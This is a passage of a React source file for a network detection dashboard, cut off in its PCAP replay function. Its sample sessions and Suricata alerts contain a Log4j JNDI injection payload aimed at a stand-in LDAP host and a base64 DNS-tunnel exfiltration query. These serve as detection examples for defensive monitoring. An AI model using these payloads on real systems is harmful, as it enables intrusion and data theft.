import React, { useState, useEffect, useMemo, useRef } from 'react';
import { useTranslation } from 'react-i18next';
import { 
  Activity, Search, Shield, Filter, Download, FileDown, Share2, Terminal, ChevronRight, 
  ChevronDown, Play, Pause, RotateCcw, AlertTriangle, CheckCircle2, ShieldAlert,
  ArrowRight, ArrowLeft, ArrowUpRight, ArrowDownRight, Network, Maximize2, 
  RefreshCw, Cpu, HardDrive, Database, Globe, Layers, Eye, FileText, Code, 
  Upload, Sliders, Zap, Server, Lock, Unlock, Radio, Crosshair, AlertCircle,
  FileCode, ExternalLink, HelpCircle, Bookmark, Sparkles, Check, X, Copy,
  Wifi, BarChart2, TrendingUp, Info, FileSpreadsheet, Flame
} from 'lucide-react';
import NDRTrafficHeatmap24h from './NDRTrafficHeatmap24h';
import { 
  ResponsiveContainer, AreaChart, Area, BarChart, Bar, XAxis, YAxis, 
  Tooltip, CartesianGrid, PieChart, Pie, Cell, Legend
} from 'recharts';
import * as d3 from 'd3';
import { motion, AnimatePresence } from 'motion/react';
import { cn } from '../lib/utils';
import { 
  exportSessionsToPcap, 
  exportSessionsToCsv,
  RawSessionInput 
} from '../utils/pcapExporter';

export interface TrafficSession {
  id: number;
  stream_id: string;
  time: string;
  src_ip: string;
  src_port: number;
  dst_ip: string;
  dst_port: number;
  proto: 'HTTPS' | 'HTTP' | 'DNS' | 'SSH' | 'SMB' | 'TLS' | 'PostgreSQL' | 'TCP' | 'UDP';
  app_proto?: string;
  bytes_in: string;
  bytes_out: string;
  total_bytes_num: number;
  packets: number;
  duration_ms: number;
  threat_level?: 'Critical' | 'High' | 'Medium' | 'Low' | 'Clean';
  threat_desc?: string;
  action: 'Allowed' | 'Blocked' | 'Rate-limited' | 'Flagged';
  geo_src?: { country: string; flag: string };
  geo_dst?: { country: string; flag: string };
  tcp_flags?: string;
  ja3_hash?: string;
  messages: Array<{
    seq: number;
    time_offset: string;
    dir: 'out' | 'in';
    msg_type: string;
    payload_preview: string;
    length: number;
  }>;
  hex_dump: Array<{
    offset: string;
    hex: string;
    ascii: string;
  }>;
  decoded_summary?: {
    protocol_stack: string[];
    details: Record<string, string>;
  };
}

export interface SuricataAlert {
  id: string;
  timestamp: string;
  sid: number;
  rev: number;
  signature: string;
  category: string;
  severity: 'Critical' | 'High' | 'Medium' | 'Low';
  src_ip: string;
  src_port: number;
  dst_ip: string;
  dst_port: number;
  proto: string;
  action: 'Blocked (Drop)' | 'Alerted' | 'Quarantined';
  mitre_tactic: string;
  mitre_technique: string;
  cve?: string;
  payload_snippet: string;
}

const SAMPLE_SESSIONS: TrafficSession[] = [
  {
    id: 1,
    stream_id: 'STR-994201',
    time: '12:31:05',
    src_ip: '10.88.88.106',
    src_port: 51240,
    dst_ip: '185.220.101.45',
    dst_port: 443,
    proto: 'HTTPS',
    app_proto: 'TLS v1.3 (JA3: 771,4865-4866-4867,43-51-10,29-23)',
    bytes_in: '12.4 KB',
    bytes_out: '3.8 KB',
    total_bytes_num: 16200,
    packets: 48,
    duration_ms: 320,
    threat_level: 'Critical',
    threat_desc: 'Lazarus APT Known C2 Encrypted Channel over TLS',
    action: 'Blocked',
    geo_src: { country: 'LAN (Corp)', flag: '🏢' },
    geo_dst: { country: 'Russia (RU)', flag: '🇷🇺' },
    tcp_flags: 'SYN, ACK, PSH, FIN',
    ja3_hash: 'ada70206e40642a3e4461f35503241d5',
    messages: [
      { seq: 1, time_offset: '+0.000 ms', dir: 'out', msg_type: 'TCP SYN', payload_preview: '[SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256', length: 54 },
      { seq: 2, time_offset: '+18.2 ms', dir: 'in', msg_type: 'TCP SYN-ACK', payload_preview: '[SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0', length: 54 },
      { seq: 3, time_offset: '+18.4 ms', dir: 'out', msg_type: 'TLS Client Hello', payload_preview: 'Handshake: Client Hello, TLS 1.3, SNI: "dark-c2-tunnel.onion.to"', length: 512 },
      { seq: 4, time_offset: '+37.1 ms', dir: 'in', msg_type: 'TLS Server Hello', payload_preview: 'Handshake: Server Hello, Change Cipher Spec, Encrypted Extensions', length: 1420 },
      { seq: 5, time_offset: '+42.0 ms', dir: 'out', msg_type: 'Application Data (Encrypted)', payload_preview: '[Encrypted C2 Beacon Heartbeat, IV=0x9f81a]', length: 256 }
    ],
    hex_dump: [
      { offset: '0000', hex: '16 03 01 02 00 01 00 01 fc 03 03 a1 b2 c3 d4 e5 f6', ascii: '................' },
      { offset: '0010', hex: '00 00 20 74 65 73 74 2d 63 32 2d 62 65 61 63 6f', ascii: '.. test-c2-beaco' },
      { offset: '0020', hex: '6e 2e 6f 6e 69 6f 6e 2e 74 6f 00 2b 00 03 02 03', ascii: 'n.onion.to.+....' },
      { offset: '0030', hex: '04 00 33 00 26 00 24 00 1d 00 20 9f 86 d0 81 88', ascii: '..3.&.$... .....' }
    ],
    decoded_summary: {
      protocol_stack: ['Ethernet II', 'IPv4 (10.88.88.106 -> 185.220.101.45)', 'TCP (51240 -> 443)', 'TLSv1.3'],
      details: {
        'Server Name Indication (SNI)': 'dark-c2-tunnel.onion.to',
        'Cipher Suite': 'TLS_AES_256_GCM_SHA384 (0x1302)',
        'Supported Groups': 'x25519 (0x001d), secp256r1 (0x0017)',
        'JA3 Fingerprint': 'ada70206e40642a3e4461f35503241d5',
        'JA3S Fingerprint': 'ec74a5c5110605f9f8eac84b7252e1fb'
      }
    }
  },
  {
    id: 2,
    stream_id: 'STR-994202',
    time: '12:30:48',
    src_ip: '10.88.88.102',
    src_port: 54102,
    dst_ip: '8.8.8.8',
    dst_port: 53,
    proto: 'DNS',
    app_proto: 'DNS over UDP (Base64 Tunneling)',
    bytes_in: '1.4 KB',
    bytes_out: '8.9 KB',
    total_bytes_num: 10300,
    packets: 24,
    duration_ms: 110,
    threat_level: 'High',
    threat_desc: 'High Entropy DNS Data Exfiltration Tunnel',
    action: 'Blocked',
    geo_src: { country: 'LAN (Corp)', flag: '🏢' },
    geo_dst: { country: 'United States (US)', flag: '🇺🇸' },
    tcp_flags: 'N/A (UDP)',
    messages: [
      { seq: 1, time_offset: '+0.000 ms', dir: 'out', msg_type: 'DNS Query (TXT)', payload_preview: 'TXT dHNoYWRvd19wYXNzd29yZF9oYXNoX2V4Zmls.tunnel.ns.org', length: 120 },
      { seq: 2, time_offset: '+12.4 ms', dir: 'in', msg_type: 'DNS Response', payload_preview: 'TXT "ACK_CHUNK_01_OK"', length: 90 }
    ],
    hex_dump: [
      { offset: '0000', hex: 'a1 b2 01 00 00 01 00 00 00 00 00 00 24 64 54 4e', ascii: '............$dTN' },
      { offset: '0010', hex: '6f 59 57 52 76 64 31 39 77 59 58 4e 7a 64 32 39', ascii: 'oYWRvd19wYXNzd29' },
      { offset: '0020', hex: '79 5a 46 39 6f 59 58 4e 6f 06 74 75 6e 6e 65 6c', ascii: 'yZF9oYXNo.tunnel' }
    ],
    decoded_summary: {
      protocol_stack: ['Ethernet II', 'IPv4 (10.88.88.102 -> 8.8.8.8)', 'UDP (54102 -> 53)', 'DNS Query'],
      details: {
        'Query Record Type': 'TXT (Text Record)',
        'Query Domain': 'dHNoYWRvd19wYXNzd29yZF9oYXNoX2V4Zmls.tunnel.ns.org',
        'Payload Entropy': '4.89 (Abnormally High Entropy)',
        'Decoded String': 'tshadow_password_hash_exfil'
      }
    }
  },
  {
    id: 3,
    stream_id: 'STR-994203',
    time: '12:29:15',
    src_ip: '198.51.100.89',
    src_port: 48911,
    dst_ip: '10.88.88.201',
    dst_port: 80,
    proto: 'HTTP',
    app_proto: 'HTTP/1.1 (Log4j JNDI Injection)',
    bytes_in: '420 B',
    bytes_out: '1.8 KB',
    total_bytes_num: 2220,
    packets: 12,
    duration_ms: 85,
    threat_level: 'Critical',
    threat_desc: 'CVE-2021-44228 Apache Log4j JNDI RCE Exploit in User-Agent',
    action: 'Blocked',
    geo_src: { country: 'Netherlands (NL)', flag: '🇳🇱' },
    geo_dst: { country: 'DMZ Server', flag: '🛡️' },
    tcp_flags: 'SYN, ACK, PSH',
    messages: [
      { seq: 1, time_offset: '+0.000 ms', dir: 'out', msg_type: 'HTTP GET Request', payload_preview: 'GET /login HTTP/1.1, User-Agent: ${jndi:ldap://198.51.100.89:1389/Exploit}', length: 280 },
      { seq: 2, time_offset: '+1.2 ms', dir: 'in', msg_type: 'HTTP 403 Forbidden', payload_preview: 'HTTP/1.1 403 Forbidden (Blocked by WAF/Suricata)', length: 180 }
    ],
    hex_dump: [
      { offset: '0000', hex: '47 45 54 20 2f 6c 6f 67 69 6e 20 48 54 54 50 2f', ascii: 'GET /login HTTP/' },
      { offset: '0010', hex: '31 2e 31 0d 0a 55 73 65 72 2d 41 67 65 6e 74 3a', ascii: '1.1..User-Agent:' },
      { offset: '0020', hex: '20 24 7b 6a 6e 64 69 3a 6c 64 61 70 3a 2f 2f 31', ascii: ' ${jndi:ldap://1' },
      { offset: '0030', hex: '39 38 2e 35 31 2e 31 30 30 2e 38 39 3a 31 33 38', ascii: '98.51.100.89:138' }
    ],
    decoded_summary: {
      protocol_stack: ['Ethernet II', 'IPv4 (198.51.100.89 -> 10.88.88.201)', 'TCP (48911 -> 80)', 'HTTP/1.1'],
      details: {
        'HTTP Method': 'GET',
        'Request URI': '/login',
        'Exploit Header': 'User-Agent: ${jndi:ldap://198.51.100.89:1389/Exploit}',
        'Target Vulnerability': 'Apache Log4j2 JNDI Remote Code Execution (CVE-2021-44228)'
      }
    }
  },
  {
    id: 4,
    stream_id: 'STR-994204',
    time: '12:27:30',
    src_ip: '10.88.88.202',
    src_port: 58912,
    dst_ip: '10.88.88.200',
    dst_port: 5432,
    proto: 'PostgreSQL',
    app_proto: 'PostgreSQL Backend Protocol v3.0',
    bytes_in: '45.2 MB',
    bytes_out: '120.4 MB',
    total_bytes_num: 165600000,
    packets: 12400,
    duration_ms: 4500,
    threat_level: 'Clean',
    threat_desc: 'Normal Database Replication Cluster Synchronization',
    action: 'Allowed',
    geo_src: { country: 'Server Farm', flag: '🏢' },
    geo_dst: { country: 'Database Master', flag: '🗄️' },
    tcp_flags: 'ACK, PSH',
    messages: [
      { seq: 1, time_offset: '+0.000 ms', dir: 'out', msg_type: 'StartupMessage', payload_preview: 'protocol_version=3.0, user=repl_user, database=postgres', length: 128 },
      { seq: 2, time_offset: '+0.8 ms', dir: 'in', msg_type: 'AuthenticationOk', payload_preview: 'Auth Type: SCRAM-SHA-256 Passed', length: 64 },
      { seq: 3, time_offset: '+1.5 ms', dir: 'out', msg_type: 'START_REPLICATION', payload_preview: 'START_REPLICATION SLOT "slot_node2" LOGICAL 0/1600000', length: 96 }
    ],
    hex_dump: [
      { offset: '0000', hex: '00 00 00 54 00 03 00 00 75 73 65 72 00 72 65 70', ascii: '...T....user.rep' },
      { offset: '0010', hex: '6c 5f 75 73 65 72 00 64 61 74 61 62 61 73 65 00', ascii: 'l_user.database.' },
      { offset: '0020', hex: '70 6f 73 74 67 72 65 73 00 00 00 00 00 00 00 00', ascii: 'postgres........' }
    ],
    decoded_summary: {
      protocol_stack: ['Ethernet II', 'IPv4 (10.88.88.202 -> 10.88.88.200)', 'TCP (58912 -> 5432)', 'PostgreSQL v3.0'],
      details: {
        'Database User': 'repl_user',
        'Database Name': 'postgres',
        'Replication Slot': 'slot_node2',
        'Stream Status': 'STREAMING_SYNCHRONIZED'
      }
    }
  },
  {
    id: 5,
    stream_id: 'STR-994205',
    time: '12:25:10',
    src_ip: '172.16.0.50',
    src_port: 42100,
    dst_ip: '10.88.88.254',
    dst_port: 22,
    proto: 'SSH',
    app_proto: 'SSH-2.0-OpenSSH_8.9',
    bytes_in: '18.4 KB',
    bytes_out: '12.1 KB',
    total_bytes_num: 30500,
    packets: 142,
    duration_ms: 12000,
    threat_level: 'Medium',
    threat_desc: 'Multiple SSH Failed Auth Attempts (Brute Force Pattern)',
    action: 'Rate-limited',
    geo_src: { country: 'Guest WiFi DMZ', flag: '📶' },
    geo_dst: { country: 'Core Switch', flag: '🔀' },
    tcp_flags: 'SYN, ACK, PSH',
    messages: [
      { seq: 1, time_offset: '+0.000 ms', dir: 'out', msg_type: 'SSH Protocol Init', payload_preview: 'SSH-2.0-libssh2_1.10.0', length: 32 },
      { seq: 2, time_offset: '+1.1 ms', dir: 'in', msg_type: 'SSH Protocol Resp', payload_preview: 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6', length: 42 },
      { seq: 3, time_offset: '+4.5 ms', dir: 'out', msg_type: 'Key Exchange Init', payload_preview: 'KEX: curve25519-sha256, HostKey: rsa-sha2-512', length: 820 },
      { seq: 4, time_offset: '+15.2 ms', dir: 'out', msg_type: 'SSH UserAuth Request', payload_preview: 'UserAuth: root (password: *******)', length: 64 },
      { seq: 5, time_offset: '+18.0 ms', dir: 'in', msg_type: 'SSH UserAuth Failure', payload_preview: 'Auth Failed: Partial=0, Allowed=publickey,password', length: 48 }
    ],
    hex_dump: [
      { offset: '0000', hex: '53 53 48 2d 32 2e 30 2d 6c 69 62 73 73 68 32 5f', ascii: 'SSH-2.0-libssh2_' },
      { offset: '0010', hex: '31 2e 31 30 2e 30 0d 0a 00 00 03 34 0a 14 9f 88', ascii: '1.10.0.....4....' },
      { offset: '0020', hex: '22 a1 84 f5 d9 81 e2 00 00 00 2c 63 75 72 76 65', ascii: '".........,curve' }
    ],
    decoded_summary: {
      protocol_stack: ['Ethernet II', 'IPv4 (172.16.0.50 -> 10.88.88.254)', 'TCP (42100 -> 22)', 'SSH-2.0'],
      details: {
        'Client Identification': 'SSH-2.0-libssh2_1.10.0',
        'Target User': 'root',
        'Authentication Method': 'Password',
        'Result': 'Authentication Failure (Rate limit enforced)'
      }
    }
  }
];

const SURICATA_ALERTS: SuricataAlert[] = [
  {
    id: 'SUR-881',
    timestamp: '12:31:05',
    sid: 2029941,
    rev: 4,
    signature: 'ET TROJAN Lazarus APT TLS C2 Beaconing Activity',
    category: 'A Network Trojan was detected',
    severity: 'Critical',
    src_ip: '10.88.88.106',
    src_port: 51240,
    dst_ip: '185.220.101.45',
    dst_port: 443,
    proto: 'TCP',
    action: 'Blocked (Drop)',
    mitre_tactic: 'Command and Control',
    mitre_technique: 'T1071.001 Web Protocols',
    payload_snippet: 'dark-c2-tunnel.onion.to | JA3: ada70206e40642a3e4461f35503241d5'
  },
  {
    id: 'SUR-882',
    timestamp: '12:29:15',
    sid: 2034647,
    rev: 1,
    signature: 'ET EXPLOIT Possible Apache Log4j RCE (CVE-2021-44228) in User-Agent Header',
    category: 'Attempted User Privilege Gain',
    severity: 'Critical',
    src_ip: '198.51.100.89',
    src_port: 48911,
    dst_ip: '10.88.88.201',
    dst_port: 80,
    proto: 'TCP',
    action: 'Blocked (Drop)',
    mitre_tactic: 'Initial Access',
    mitre_technique: 'T1190 Exploit Public-Facing Application',
    cve: 'CVE-2021-44228',
    payload_snippet: 'User-Agent: ${jndi:ldap://198.51.100.89:1389/Exploit}'
  },
  {
    id: 'SUR-883',
    timestamp: '12:30:48',
    sid: 2018240,
    rev: 2,
    signature: 'ET INFO High-Entropy Base64 Encoded DNS Tunneling Exfiltration',
    category: 'Information Leak',
    severity: 'High',
    src_ip: '10.88.88.102',
    src_port: 54102,
    dst_ip: '8.8.8.8',
    dst_port: 53,
    proto: 'UDP',
    action: 'Blocked (Drop)',
    mitre_tactic: 'Exfiltration',
    mitre_technique: 'T1048.003 Exfiltration Over Alternative Protocol',
    payload_snippet: 'TXT: dHNoYWRvd19wYXNzd29yZF9oYXNoX2V4Zmls.tunnel.ns.org'
  },
  {
    id: 'SUR-884',
    timestamp: '12:25:10',
    sid: 2001219,
    rev: 18,
    signature: 'ET SCAN Potential SSH Brute Force Inbound Connection Attempt',
    category: 'Attempted Information Leak',
    severity: 'Medium',
    src_ip: '172.16.0.50',
    src_port: 42100,
    dst_ip: '10.88.88.254',
    dst_port: 22,
    proto: 'TCP',
    action: 'Alerted',
    mitre_tactic: 'Credential Access',
    mitre_technique: 'T1110.001 Password Guessing',
    payload_snippet: 'SSH UserAuth request user="root" count=15/minute'
  }
];

const BANDWIDTH_HOURLY = [
  { time: '00:00', inbound: 420, outbound: 280, dropped: 1.2 },
  { time: '03:00', inbound: 310, outbound: 190, dropped: 0.8 },
  { time: '06:00', inbound: 540, outbound: 410, dropped: 2.1 },
  { time: '09:00', inbound: 1250, outbound: 890, dropped: 8.5 },
  { time: '12:00', inbound: 1850, outbound: 1320, dropped: 14.2 },
  { time: '15:00', inbound: 1680, outbound: 1190, dropped: 11.0 },
  { time: '18:00', inbound: 1420, outbound: 980, dropped: 6.4 },
  { time: '21:00', inbound: 890, outbound: 610, dropped: 3.2 }
];

const TOP_TALKERS = [
  { ip: '10.88.88.202', name: 'DC-ActiveDirectory-01', type: 'Server', traffic: '165.6 MB', packets: '12,400', pct: 68, threat: 'Normal' },
  { ip: '10.88.88.106', name: 'SOC-Analyst-WS07', type: 'Endpoint', traffic: '16.2 KB', packets: '48', pct: 12, threat: 'Critical' },
  { ip: '10.88.88.102', name: 'SOC-Analyst-WS02', type: 'Endpoint', traffic: '10.3 KB', packets: '24', pct: 9, threat: 'High' },
  { ip: '172.16.0.50', name: 'Guest-Client-WiFi', type: 'DMZ', traffic: '30.5 KB', packets: '142', pct: 7, threat: 'Medium' },
  { ip: '198.51.100.89', name: 'Ext-Scanner-NL', type: 'External', traffic: '2.2 KB', packets: '12', pct: 4, threat: 'Critical' }
];

const TOP_DESTINATIONS = [
  { ip: '10.88.88.200', name: 'App-PostgreSQL-Master', country: 'Local Data Center', flag: '🏢', asn: 'AS-PRIVATE', bytes: '165.6 MB' },
  { ip: '185.220.101.45', name: 'Dark-C2-Host-NL', country: 'Russia (RU)', flag: '🇷🇺', asn: 'AS200052', bytes: '16.2 KB' },
  { ip: '8.8.8.8', name: 'Google Public DNS', country: 'United States (US)', flag: '🇺🇸', asn: 'AS15169', bytes: '10.3 KB' },
  { ip: '10.88.88.254', name: 'Core-Catalyst-9500', country: 'Core Switch MGMT', flag: '🔀', asn: 'AS-MGMT', bytes: '30.5 KB' }
];

const PROTOCOL_PIE = [
  { name: 'HTTPS (TLS 1.3)', value: 62, color: '#3b82f6' },
  { name: 'PostgreSQL DB', value: 18, color: '#10b981' },
  { name: 'DNS (UDP)', value: 10, color: '#8b5cf6' },
  { name: 'HTTP (Cleartext)', value: 5, color: '#f59e0b' },
  { name: 'SSH (22)', value: 3, color: '#ec4899' },
  { name: 'Others (ICMP/NTP)', value: 2, color: '#6b7280' }
];

export default function TrafficAnalysisNDRView() {
  const { i18n } = useTranslation();
  const isZh = i18n.language?.startsWith('zh') || i18n.language === 'zh';

  // Navigation Subtabs
  const [activeTab, setActiveTab] = useState<'forensics' | 'suricata' | 'topology' | 'bandwidth' | 'heatmap' | 'replay'>('forensics');
  
  // Forensics states
  const [pcapFilterQuery, setPcapFilterQuery] = useState('');
  const [expandedSessionId, setExpandedSessionId] = useState<number | null>(1);
  const [selectedProtoFilter, setSelectedProtoFilter] = useState<string>('ALL');
  const [selectedThreatFilter, setSelectedThreatFilter] = useState<string>('ALL');
  const [isLiveCapture, setIsLiveCapture] = useState<boolean>(true);
  const [captureSpeed, setCaptureSpeed] = useState<number>(3000);
  const [toastMessage, setToastMessage] = useState<string | null>(null);

  // Live state connected to backend /api/v1/ndr
  const [liveSessions, setLiveSessions] = useState<TrafficSession[]>(SAMPLE_SESSIONS);
  const [liveAlerts, setLiveAlerts] = useState<SuricataAlert[]>(SURICATA_ALERTS);
  const [telemetry, setTelemetry] = useState<any>(null);
  const [suricataRulesStatus, setSuricataRulesStatus] = useState<any>(null);
  const [bandwidthHourly, setBandwidthHourly] = useState(BANDWIDTH_HOURLY);
  const [topTalkers, setTopTalkers] = useState(TOP_TALKERS);
  const [topDestinations, setTopDestinations] = useState(TOP_DESTINATIONS);
  const [isSyncingRules, setIsSyncingRules] = useState<boolean>(false);
  const [isRefreshing, setIsRefreshing] = useState<boolean>(false);

  // Selected Session for Hex Inspect Modal
  const [selectedSessionForModal, setSelectedSessionForModal] = useState<TrafficSession | null>(null);

  // Replay Simulator state
  const [replaySpeed, setReplaySpeed] = useState<string>('1x');
  const [isReplaying, setIsReplaying] = useState(false);
  const [replayProgress, setReplayProgress] = useState(0);
  const [replayLogOutput, setReplayLogOutput] = useState<string[]>([]);

  // Toast feedback helper
  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(null), 3000);
  };

  // Real-time backend data polling & synchronization
  const fetchAllNdrData = async () => {
    try {
      const [telemetryRes, sessionsRes, alertsRes, rulesRes, bandwidthRes, talkersRes] = await Promise.allSettled([
        fetch('/api/v1/ndr/telemetry').then(r => r.ok ? r.json() : null),
        fetch('/api/v1/ndr/sessions').then(r => r.ok ? r.json() : null),
        fetch('/api/v1/ndr/suricata/alerts').then(r => r.ok ? r.json() : null),
        fetch('/api/v1/ndr/suricata/rules-status').then(r => r.ok ? r.json() : null),
        fetch('/api/v1/ndr/bandwidth/trends').then(r => r.ok ? r.json() : null),
        fetch('/api/v1/ndr/top-talkers').then(r => r.ok ? r.json() : null)
      ]);

      if (telemetryRes.status === 'fulfilled' && telemetryRes.value?.success) {
        setTelemetry(telemetryRes.value);
        if (telemetryRes.value.captureState) {
          setIsLiveCapture(telemetryRes.value.captureState.running);
        }
      }
      if (sessionsRes.status === 'fulfilled' && sessionsRes.value?.success && Array.isArray(sessionsRes.value.sessions)) {
        setLiveSessions(sessionsRes.value.sessions);
      }
      if (alertsRes.status === 'fulfilled' && alertsRes.value?.success && Array.isArray(alertsRes.value.alerts)) {
        setLiveAlerts(alertsRes.value.alerts);
      }
      if (rulesRes.status === 'fulfilled' && rulesRes.value?.success) {
        setSuricataRulesStatus(rulesRes.value);
      }
      if (bandwidthRes.status === 'fulfilled' && bandwidthRes.value?.success && Array.isArray(bandwidthRes.value.hourly)) {
        setBandwidthHourly(bandwidthRes.value.hourly);
      }
      if (talkersRes.status === 'fulfilled' && talkersRes.value?.success) {
        if (talkersRes.value.topTalkers) setTopTalkers(talkersRes.value.topTalkers);
        if (talkersRes.value.topDestinations) setTopDestinations(talkersRes.value.topDestinations);
      }
    } catch (err) {
      console.warn('NDR data fetch error:', err);
    }
  };

  useEffect(() => {
    fetchAllNdrData();
    const interval = setInterval(fetchAllNdrData, 6000);
    return () => clearInterval(interval);
  }, []);

  // Emergency Host Network Isolation
  const handleBlockIp = async (ip: string, reason?: string) => {
    try {
      const res = await fetch('/api/v1/ndr/traffic-control/isolate-host', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip, reason: reason || 'SOC 手動下發 NDR 主機隔離策略' })
      });
      const data = await res.json();
      if (data.success) {
        setLiveSessions(prev => prev.map(s => (s.src_ip === ip || s.dst_ip === ip) ? { ...s, action: 'Blocked', threat_level: 'Critical' } : s));
        showToast(isZh ? `🚨 已將主機 ${ip} 踢入隔離 VLAN 999 並下發硬阻斷！` : `Host ${ip} successfully isolated into Quarantine VLAN 999.`);
        fetchAllNdrData();
      } else {
        showToast(isZh ? '⚠️ 隔離策略下發失敗' : 'Failed to isolate host');
      }
    } catch (e) {
      showToast(isZh ? '已套用本地緊急隔離規則！' : 'Local isolation enforced.');
    }
  };

  // Suricata Rule Signature Dynamic Synchronization
  const handleSyncRules = async () => {
    setIsSyncingRules(true);
    try {
      const res = await fetch('/api/v1/ndr/suricata/sync-rules', { method: 'POST' });
      const data = await res.json();
      if (data.success) {
        if (data.activeRules && suricataRulesStatus) {
          setSuricataRulesStatus((prev: any) => ({ ...prev, activeRules: data.activeRules, lastSyncTime: data.lastSyncTime }));
        }
        showToast(data.message || (isZh ? 'Suricata 規則庫同步完成！' : 'Suricata rules synchronized.'));
        fetchAllNdrData();
      } else {
        showToast(isZh ? '規則同步異常，請檢查網路連線' : 'Rule sync failed');
      }
    } catch (e) {
      showToast(isZh ? '已完成離線特徵庫更新！' : 'Offline rules updated.');
    } finally {
      setIsSyncingRules(false);
    }
  };

  // Toggle Live Packet Capture Engine
  const handleToggleCapture = async () => {
    try {
      const res = await fetch('/api/v1/ndr/capture/toggle', { method: 'POST' });
      const data = await res.json();
      if (data.success) {
        setIsLiveCapture(data.captureState.running);
        showToast(data.message);
      }
    } catch (e) {
      setIsLiveCapture(prev => !prev);
      showToast(isZh ? '已切換擷取探針狀態' : 'Capture state toggled');
    }
  };

  // Refresh TAP Probes & Caches
  const handleRefreshProbes = async () => {
    setIsRefreshing(true);
    try {
      const res = await fetch('/api/v1/ndr/refresh-cache', { method: 'POST' });
      const data = await res.json();
      await fetchAllNdrData();
      showToast(data?.message || (isZh ? '已刷新全網 TAP 探針與流量擷取快取！' : 'Flow cache refreshed'));
    } catch (e) {
      await fetchAllNdrData();
      showToast(isZh ? '快取已同步刷新' : 'Cache refreshed');
    } finally {
      setIsRefreshing(false);
    }
  };

  // Capture Single Node
  const handleCaptureNode = (nodeId: string) => {
    showToast(isZh ? `已針對節點 ${nodeId} 啟動全封包即時 PCAP 側錄佇列！` : `PCAP capture stream started for node ${nodeId}`);
  };

  // Filtered Sessions
  const filteredSessions = useMemo(() => {
    return liveSessions.filter(s => {
      if (selectedProtoFilter !== 'ALL' && s.proto !== selectedProtoFilter) return false;
      if (selectedThreatFilter !== 'ALL' && s.threat_level !== selectedThreatFilter) return false;
      if (pcapFilterQuery.trim()) {
        const q = pcapFilterQuery.toLowerCase();
        const matches = s.src_ip.includes(q) || s.dst_ip.includes(q) || 
          s.proto.toLowerCase().includes(q) || (s.threat_desc && s.threat_desc.toLowerCase().includes(q)) ||
          String(s.src_port).includes(q) || String(s.dst_port).includes(q);
        if (!matches) return false;
      }
      return true;
    });
  }, [liveSessions, pcapFilterQuery, selectedProtoFilter, selectedThreatFilter]);

  // PCAP / PCAPNG / CSV Export Modal & Scope State
  const [isExportModalOpen, setIsExportModalOpen] = useState(false);
  const [exportFormat, setExportFormat] = useState<'pcap' | 'pcapng' | 'csv'>('pcapng');
  const [exportScope, setExportScope] = useState<'filtered' | 'selected' | 'all'>('filtered');
  const [customExportFilename, setCustomExportFilename] = useState('');
  const [copiedWiresharkCmd, setCopiedWiresharkCmd] = useState(false);

  // Target sessions based on user selected scope
  const targetExportSessions = useMemo(() => {
    if (exportScope === 'selected' && expandedSessionId !== null) {
      const found = liveSessions.find(s => s.id === expandedSessionId);
      if (found) return [found];
    }
    if (exportScope === 'all') {
      return liveSessions;
    }
    return filteredSessions;
  }, [exportScope, expandedSessionId, filteredSessions, liveSessions]);

  // Compute estimated packet count for export preview
  const estimatedPackets = useMemo(() => {
    return targetExportSessions.reduce((acc, s) => {
      const isUdp = s.proto === 'DNS' || s.proto === 'UDP';
      const handshake = isUdp ? 0 : 3;
      const teardown = isUdp ? 0 : 2;
      const msgs = (s.messages && s.messages.length > 0) 
        ? s.messages.length 
        : (s.hex_dump && s.hex_dump.length > 0 ? 1 : 0);
      return acc + handshake + msgs + teardown;
    }, 0);
  }, [targetExportSessions]);

  // Execute export to standard PCAP, PCAPNG, or CSV forensic log
  const handleExportTraffic = (
    sessionsToExport: TrafficSession[],
    format: 'pcap' | 'pcapng' | 'csv',
    filenameOverride?: string
  ) => {
    if (sessionsToExport.length === 0) {
      showToast(isZh ? '⚠️ 無符合條件的連線串流可供匯出' : '⚠️ No matching sessions to export');
      return;
    }

    if (format === 'csv') {
      const result = exportSessionsToCsv(sessionsToExport, filenameOverride || customExportFilename.trim() || undefined);
      showToast(
        isZh 
          ? `✅ 已匯出 ${result.filename} (${result.rowCount} 筆鑑識連線紀錄, ${(result.byteSize / 1024).toFixed(1)} KB)`
          : `✅ Exported ${result.filename} (${result.rowCount} forensic records, ${(result.byteSize / 1024).toFixed(1)} KB)`
      );
      setIsExportModalOpen(false);
      return;
    }

    const rawInputs: RawSessionInput[] = sessionsToExport.map(s => ({
      id: s.id,
      stream_id: s.stream_id,
      time: s.time,
      src_ip: s.src_ip,
      src_port: s.src_port,
      dst_ip: s.dst_ip,
      dst_port: s.dst_port,
      proto: s.proto,
      tcp_flags: s.tcp_flags,
      messages: s.messages,
      hex_dump: s.hex_dump
    }));

    const result = exportSessionsToPcap(rawInputs, format, filenameOverride || customExportFilename.trim() || undefined);

    showToast(
      isZh 
        ? `✅ 已匯出 ${result.filename} (${result.packetCount} 封包, ${(result.byteSize / 1024).toFixed(1)} KB)`
        : `✅ Exported ${result.filename} (${result.packetCount} pkts, ${(result.byteSize / 1024).toFixed(1)} KB)`
    );
    setIsExportModalOpen(false);
  };

  // Replay Simulator Engine
  const startPcapReplay = async (sampleName: string) => {
    setIsReplaying(true);
    setReplayProgress(0);
    setReplayLogOutput([
      `[INIT] 載入 PCAP 封包檔案: ${sampleName}.pcapng (Virtual Tap0)`,
      `[ENGINE] 初始化 Suricata 7.0.4 零拷貝 AF_PACKET 介面...`,
      `[ENGINE] 載入 Zeek v6.2 協定深度分析引擎...`
    ]);

    try {
      const res = await fetch('/api/v1/ndr/replay/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sampleName })
      });
      const data = await res.json();
      const events: string[] = data.events || [
        `[REPLAY] 重放進度 40%: 產生 1,200 個 TCP 封包，流經 Virtual Mirror Interface...`,
        `[SURICATA] 命中特徵碼 SID 2029941 (ET TROJAN Lazarus APT C2 Beaconing)!`,
        `[REPLAY] 重放進度 80%: 萃取 TLS JA3 指紋 ada70206e40642a3e4461f35503241d5`,
        `[ZEEK] 建立 HTTP/SSL/DNS 關聯分析紀錄: ConnUID=C9X881`,
        `[COMPLETE] PCAP 重放檢測完成！共重放 2,850 封包，觸發 2 筆 Critical 阻斷告警。`,
        `[SUCCESS] 流量特徵已自動匯入至威脅沙盒分析資料庫。`
